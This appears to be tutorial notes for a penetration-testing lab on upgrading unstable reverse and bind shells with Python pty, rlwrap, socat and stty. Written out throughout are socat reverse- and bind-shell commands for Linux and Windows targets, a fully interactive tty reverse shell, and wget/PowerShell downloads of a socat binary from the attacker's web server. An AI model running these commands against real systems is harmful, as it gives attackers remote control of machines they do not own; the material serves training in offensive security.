# Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

*    The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
*    Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
*    Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

# rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 

# Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary `(sudo python3 -m http.server 80)`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 
## Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

`socat TCP-L:<port> -`

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>.`

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells

On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

# Powerful uses of socat
Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

``` socat TCP-L:<port> FILE:`tty`,raw,echo=0 ```

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are allocating a new tty, and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and allocating a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:

*    pty, allocates a pseudoterminal on the target -- part of the stabilisation process
*    stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
*    sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
*    setsid, creates the process in a new session
*    sane, stabilises the terminal, attempting to "normalise" it.

That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

# cols and rows

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:
![image](https://i.imgur.com/7aOKtlO.png)
Next, in your reverse/bind shell, type in:

`stty rows <number>`

and

`stty cols <number>`

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
